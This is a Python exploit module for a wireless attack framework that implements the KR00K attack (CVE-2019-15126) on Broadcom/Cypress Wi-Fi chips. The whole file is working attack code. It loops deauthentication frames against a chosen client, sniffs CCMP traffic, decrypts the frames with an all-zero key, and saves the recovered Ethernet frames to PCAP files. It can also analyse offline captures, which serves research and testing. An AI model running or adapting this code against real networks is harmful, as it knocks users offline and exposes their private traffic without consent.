#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""Native KR00K (CVE-2019-15126) WPA2 CCMP decryption attack.

Exploits Broadcom/Cypress Wi-Fi chips that zero the Temporal Key (TK) on
disassociation while still transmitting buffered frames encrypted with the
zeroed key. Captures and decrypts those frames without knowing the WPA2
passphrase.

Requires: monitor mode interface with injection capability.
Dependencies: scapy, pycryptodome (Cryptodome.Cipher.AES MODE_CCM).

Version: 1.0.0
"""

from __future__ import annotations

import logging
import os
import struct
import threading
import time
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from wirelessxpl.core.exploit import *

logger = logging.getLogger(__name__)

try:
    from scapy.all import (
        Dot11, Dot11CCMP, Dot11Deauth, Ether, RadioTap,
        rdpcap, sendp, sniff, wrpcap,
    )
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

try:
    from Cryptodome.Cipher import AES
    HAS_CRYPTO = True
except ImportError:
    try:
        from Crypto.Cipher import AES
        HAS_CRYPTO = True
    except ImportError:
        HAS_CRYPTO = False

SNAP_HEADER = b"\xaa\xaa\x03\x00\x00\x00"
ZERO_TK = b"\x00" * 16


class Exploit(Exploit):
    """Native KR00K attack — deauth + sniff + decrypt with all-zero TK."""

    __info__ = {
        "name": "KR00K Attack (CVE-2019-15126)",
        "description": (
            "Exploits Broadcom/Cypress Wi-Fi chip flaw: after deauth, buffered "
            "frames are transmitted encrypted with an all-zero Temporal Key. "
            "Captures CCMP frames and decrypts them without the WPA2 password. "
            "Native implementation — no external tools required."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "Original research: ESET (CVE-2019-15126)",
        ),
        "references": (
            "https://www.welivesecurity.com/wp-content/uploads/2020/02/ESET_Kr00k.pdf",
            "https://github.com/hexway/r00kie-kr00kie",
        ),
        "devices": ("wifi",),
    }

    interface = OptString("wlan0mon", "Monitor mode interface with injection")
    target_bssid = OptMAC("", "Target AP BSSID (e.g. AA:BB:CC:DD:EE:FF)")
    target_client = OptMAC("", "Target station/client MAC address")
    channel = OptInteger(1, "Wi-Fi channel of the target AP")
    deauth_count = OptInteger(5, "Deauth frames per burst")
    deauth_interval = OptFloat(5.0, "Seconds between deauth bursts")
    pcap_input = OptString("", "Offline PCAP file to analyze (skip live capture)")
    output_encrypted = OptString("kr00k_encrypted.pcap", "Output file for captured encrypted frames")
    output_decrypted = OptString("kr00k_decrypted.pcap", "Output file for decrypted frames")
    dry_run = OptBool(False, "Show configuration without executing")

    def __init__(self) -> None:
        super().__init__()
        self._stop_event = threading.Event()
        self._encrypted_packets: List = []
        self._decrypted_packets: List = []
        self._stats: Dict[str, int] = {
            "captured": 0,
            "decrypted": 0,
            "failed": 0,
        }

    @staticmethod
    def _build_nonce(qos_priority: int, src_mac: str, pn: str) -> bytes:
        """Build 13-byte CCM nonce: QoS(1) + MAC(6) + PN(6)."""
        return bytes([qos_priority]) + bytes.fromhex(src_mac) + bytes.fromhex(pn)

    @staticmethod
    def _extract_pn(pkt) -> str:
        """Extract Packet Number from Dot11CCMP layer as big-endian hex."""
        return "{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}".format(
            pkt.PN5, pkt.PN4, pkt.PN3, pkt.PN2, pkt.PN1, pkt.PN0
        )

    @staticmethod
    def _mac_to_hex(mac: str) -> str:
        """Convert 'AA:BB:CC:DD:EE:FF' to 'aabbccddeeff'."""
        return mac.lower().replace(":", "")

    @classmethod
    def decrypt_frame(cls, encrypted_data: bytes, src_mac: str,
                      pn: str, qos_priority: int = 0) -> Optional[bytes]:
        """Attempt KR00K decryption of a CCMP frame with all-zero TK.

        Args:
            encrypted_data: CCMP payload without trailing 8-byte MIC.
            src_mac: Source MAC (addr2) as 12-char hex string.
            pn: Packet Number as 12-char big-endian hex string.
            qos_priority: QoS TID byte (usually 0).

        Returns:
            Decrypted plaintext if TK=zero is valid, None otherwise.
        """
        nonce = cls._build_nonce(qos_priority, src_mac, pn)
        cipher = AES.new(ZERO_TK, AES.MODE_CCM, nonce=nonce, mac_len=8)
        plaintext = cipher.decrypt(encrypted_data)

        if plaintext[:3] == b"\xaa\xaa\x03":
            return plaintext
        return None

    @staticmethod
    def reconstruct_ethernet(plaintext: bytes, dst_mac: str,
                             src_mac: str) -> bytes:
        """Rebuild Ethernet frame from decrypted SNAP/LLC payload."""
        eth_dst = bytes.fromhex(dst_mac)
        eth_src = bytes.fromhex(src_mac)
        ethertype = plaintext[6:8]
        payload = plaintext[8:]
        return eth_dst + eth_src + ethertype + payload

    def _deauth_loop(self) -> None:
        """Send deauthentication frames in a loop until stopped."""
        bssid = self.target_bssid.lower()
        client = self.target_client.lower()

        deauth_pkt = (
            RadioTap()
            / Dot11(
                type=0, subtype=12,
                addr1=client,
                addr2=bssid,
                addr3=bssid,
            )
            / Dot11Deauth(reason=7)
        )

        logger.info("Deauth thread started: %s -> %s (count=%d, interval=%.1fs)",
                     bssid, client, self.deauth_count, self.deauth_interval)

        while not self._stop_event.is_set():
            try:
                sendp(deauth_pkt, iface=self.interface,
                      count=self.deauth_count, inter=0.01, verbose=False)
            except Exception as err:
                logger.warning("Deauth send error: %s", err)
            self._stop_event.wait(self.deauth_interval)

    def _analyze_packet(self, pkt) -> None:
        """Process a captured 802.11 CCMP frame."""
        if not pkt.haslayer(Dot11CCMP):
            return

        self._stats["captured"] += 1
        self._encrypted_packets.append(pkt)

        ccmp = pkt[Dot11CCMP]
        src_mac = self._mac_to_hex(pkt.addr2)
        dst_mac = self._mac_to_hex(pkt.addr3) if pkt.addr3 else self._mac_to_hex(pkt.addr1)
        pn = self._extract_pn(ccmp)

        qos = 0
        if hasattr(pkt, "TID"):
            qos = pkt.TID & 0x0F

        encrypted_data = bytes(ccmp.data)[:-8] if hasattr(ccmp, "data") else b""
        if not encrypted_data:
            return

        plaintext = self.decrypt_frame(encrypted_data, src_mac, pn, qos)
        if plaintext is not None:
            self._stats["decrypted"] += 1
            eth_frame = self.reconstruct_ethernet(plaintext, dst_mac, src_mac)
            self._decrypted_packets.append(Ether(eth_frame))
            logger.info(
                "[KR00K] Decrypted frame #%d: %s -> %s (%d bytes plaintext)",
                self._stats["decrypted"], pkt.addr2, pkt.addr3 or pkt.addr1,
                len(plaintext),
            )
            print_success(
                "KR00K decrypted! Frame #{}: {} -> {} ({} bytes)".format(
                    self._stats["decrypted"], pkt.addr2,
                    pkt.addr3 or pkt.addr1, len(plaintext),
                )
            )
        else:
            self._stats["failed"] += 1

    def _save_results(self) -> None:
        """Save captured and decrypted packets to PCAP files."""
        if self._encrypted_packets and self.output_encrypted:
            wrpcap(self.output_encrypted, self._encrypted_packets)
            logger.info("Saved %d encrypted frames to %s",
                        len(self._encrypted_packets), self.output_encrypted)

        if self._decrypted_packets and self.output_decrypted:
            wrpcap(self.output_decrypted, self._decrypted_packets)
            logger.info("Saved %d decrypted frames to %s",
                        len(self._decrypted_packets), self.output_decrypted)

    def run(self) -> None:
        """Execute the KR00K attack."""
        if not HAS_SCAPY:
            print_error("scapy is required. Install: pip install scapy")
            return
        if not HAS_CRYPTO:
            print_error("pycryptodome is required. Install: pip install pycryptodome")
            return

        if self.dry_run:
            print_info("KR00K Attack Configuration:")
            print_info("  Interface:  {}".format(self.interface))
            print_info("  BSSID:      {}".format(self.target_bssid))
            print_info("  Client:     {}".format(self.target_client))
            print_info("  Channel:    {}".format(self.channel))
            print_info("  Deauth:     {} frames every {:.1f}s".format(
                self.deauth_count, self.deauth_interval))
            if self.pcap_input:
                print_info("  PCAP input: {}".format(self.pcap_input))
            return

        if self.pcap_input:
            print_status("Analyzing offline PCAP: {}".format(self.pcap_input))
            packets = rdpcap(self.pcap_input)
            for pkt in packets:
                self._analyze_packet(pkt)
            self._save_results()
            print_success(
                "KR00K offline analysis complete: {captured} captured, "
                "{decrypted} decrypted, {failed} not vulnerable".format(**self._stats)
            )
            return

        if not self.target_bssid or not self.target_client:
            print_error("target_bssid and target_client are required for live mode.")
            return

        if os.getuid() != 0:
            print_error("Root privileges required for monitor mode and injection.")
            return

        print_status("Starting KR00K attack on channel {}...".format(self.channel))
        print_info("BSSID: {}  Client: {}".format(self.target_bssid, self.target_client))

        bssid = self.target_bssid.lower()
        client = self.target_client.lower()

        deauth_thread = threading.Thread(target=self._deauth_loop, daemon=True)
        deauth_thread.start()

        try:
            print_status("Sniffing for CCMP frames... (Ctrl+C to stop)")
            sniff(
                iface=self.interface,
                prn=self._analyze_packet,
                lfilter=lambda x: (
                    x.haslayer(Dot11)
                    and (x.addr1 == bssid or x.addr2 == client)
                ),
                store=False,
            )
        except KeyboardInterrupt:
            print_info("\nStopping KR00K attack...")
        finally:
            self._stop_event.set()
            deauth_thread.join(timeout=3)
            self._save_results()

        print_success(
            "KR00K results: {captured} captured, {decrypted} decrypted, "
            "{failed} not vulnerable".format(**self._stats)
        )
